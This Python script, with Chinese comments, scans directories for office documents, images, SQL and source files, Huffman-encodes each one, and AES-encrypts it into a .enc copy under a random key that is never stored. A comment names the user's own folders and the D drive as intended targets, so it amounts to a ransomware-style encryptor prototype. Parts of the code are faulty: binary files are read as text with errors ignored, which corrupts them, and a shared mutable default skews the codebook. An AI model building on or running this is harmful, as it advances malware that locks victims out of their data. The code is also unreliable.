import os
import fnmatch
import heapq
import json
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes

# 霍夫曼編碼相關類和函數
class HuffmanNode:
    def __init__(self, freq, char=None, left=None, right=None):
        self.freq = freq
        self.char = char
        self.left = left
        self.right = right

    def __lt__(self, other):
        return self.freq < other.freq

def build_huffman_tree(frequencies):
    if not frequencies:
        raise ValueError("The frequency dictionary is empty, cannot build Huffman Tree.")
    heap = [HuffmanNode(freq, char) for char, freq in frequencies.items()]
    heapq.heapify(heap)

    while len(heap) > 1:
        left = heapq.heappop(heap)
        right = heapq.heappop(heap)
        merged = HuffmanNode(left.freq + right.freq, left=left, right=right)
        heapq.heappush(heap, merged)

    return heap[0]

def generate_huffman_codes(node, prefix="", codebook={}):
    if node.char is not None:
        codebook[node.char] = prefix
    else:
        generate_huffman_codes(node.left, prefix + "0", codebook)
        generate_huffman_codes(node.right, prefix + "1", codebook)
    return codebook

def huffman_encode(data):
    if not data:
        raise ValueError("The input data for Huffman encoding is empty.")
    frequencies = {}
    for char in data:
        frequencies[char] = frequencies.get(char, 0) + 1

    huffman_tree = build_huffman_tree(frequencies)
    huffman_codes = generate_huffman_codes(huffman_tree)

    encoded_data = ''.join(huffman_codes[char] for char in data)
    return encoded_data, huffman_codes

def huffman_decode(encoded_data, huffman_codes):
    reverse_codebook = {v: k for k, v in huffman_codes.items()}
    current_code = ""
    decoded_data = []

    for bit in encoded_data:
        current_code += bit
        if current_code in reverse_codebook:
            decoded_data.append(reverse_codebook[current_code])
            current_code = ""

    return ''.join(decoded_data)

# AES加密相關函數
def aes_encrypt(data, key):
    cipher = AES.new(key, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(data.encode('utf-8'), AES.block_size))
    return cipher.iv + ct_bytes

def aes_decrypt(enc_data, key):
    iv = enc_data[:AES.block_size]
    ct = enc_data[AES.block_size:]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    pt = unpad(cipher.decrypt(ct), AES.block_size)
    return pt.decode('utf-8')

# 掃描和加密文件
def scan_and_encrypt(root_path, patterns, key):
    for root, _, files in os.walk(root_path):
        for pattern in patterns:
            for filename in fnmatch.filter(files, pattern):
                file_path = os.path.join(root, filename)
                try:
                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                        file_data = f.read()

                    if not file_data:
                        print(f"File {file_path} is empty, skipping.")
                        continue

                    # 霍夫曼編碼
                    encoded_data, huffman_codes = huffman_encode(file_data)
                    encoded_data_json = json.dumps({"encoded_data": encoded_data, "codes": huffman_codes})

                    # AES加密
                    encrypted_data = aes_encrypt(encoded_data_json, key)

                    # 保存加密文件
                    with open(file_path + '.enc', 'wb') as ef:
                        ef.write(encrypted_data)
                    
                    print(f"File {file_path} encrypted successfully.")
                except Exception as e:
                    print(f"Error processing file {file_path}: {e}")

if __name__ == "__main__":
    key = get_random_bytes(16)  # AES-128
    root_paths = ["E:\\test"]  # 假設當前登入者的資料夾路徑和D槽
    patterns = ['*.xlsx', '*.docx', '*.pptx', '*.jpeg', '*.png', '*.gif', '*.sql', '*.ai', '*.cpp', '*.c', '*.java', '*.py', '*.html', '*.js']

    for path in root_paths:
        scan_and_encrypt(path, patterns, key)

    print("加密完成！")
